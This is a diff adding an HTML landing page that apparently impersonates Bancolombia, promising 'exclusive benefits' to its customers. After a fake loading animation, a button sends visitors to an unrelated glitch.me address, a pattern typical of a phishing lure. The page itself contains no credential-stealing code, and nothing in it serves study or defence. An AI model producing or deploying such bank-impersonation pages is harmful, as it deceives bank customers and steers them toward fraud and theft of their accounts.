@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beneficios Exclusivo para Clientes Bancolombia</title>
+
+    <style>
+        /* Estilo del botón */
+        #boton-beneficio {
+            display: none;
+            background-color: #FFD700; /* Color amarillo */
+            color: #000; /* Color del texto */
+            border: none;
+            border-radius: 50px; /* Bordes redondeados */
+            padding: 15px 40px;
+            font-size: 18px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        #boton-beneficio:hover {
+            background-color: #FFC700; /* Color más oscuro al pasar el mouse */
+        }
+
+        /* Contenedor para las imágenes */
+        .contenedor-imagen {
+            position: relative;
+            width: 250px; /* Ajusta el ancho según sea necesario */
+            height: 80px; /* Ajusta la altura según sea necesario */
+            margin: 0 auto; /* Centrar el contenedor */
+        }
+
+        /* El GIF y la imagen estática deben tener las mismas dimensiones */
+        #blob-img {
+            position: absolute;
+            top: 2px;
+            left: 10px;
+            width: 90%;
+            height: 100%;
+            object-fit: cover; /* Asegura que mantengan las mismas dimensiones exactas */
+        }
+        
+        #gif-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Ocultar la imagen estática al inicio */
+        #blob-img {
+            display: none;
+        }
+    </style>
+
+    <script>
+        // Mostrar el botón después de 1 segundo
+        setTimeout(function() {
+            document.getElementById("boton-beneficio").style.display = "inline-block";
+        }, 1000);
+
+        // Reemplazar el gif por la imagen estática después de 4 segundos
+        setTimeout(function() {
+            document.getElementById("gif-img").style.display = "none"; // Ocultar el gif
+            document.getElementById("blob-img").style.display = "block"; // Mostrar la imagen estática
+        }, 4000);
+
+        // Función para redirigir al hacer clic en el botón
+        function redirigir() {
+            window.location.href = "https://uncovered-cypress-iron.glitch.me/"; // Reemplaza con la URL de destino
+        }
+    </script>
+</head>
+<body style="background-color:#FCFCFF;">
+    <br><br><br><br><br>
+<center>
+    <div class="contenedor-imagen">
+        <!-- Imagen estática que se mostrará después de 4 segundos -->
+        <img id="blob-img" src="archivo/blob.png" alt="Cargado">
+        <!-- GIF que será reemplazado -->
+        <img id="gif-img" src="archivo/dina.gif" alt="Cargando...">
+    </div>
+    <br><br><br>
+    <!-- Botón que aparece después de 1 segundo -->
+    <button id="boton-beneficio" onclick="redirigir()">Obtener beneficios</button>
+</center>
+
+</body>
+</html>
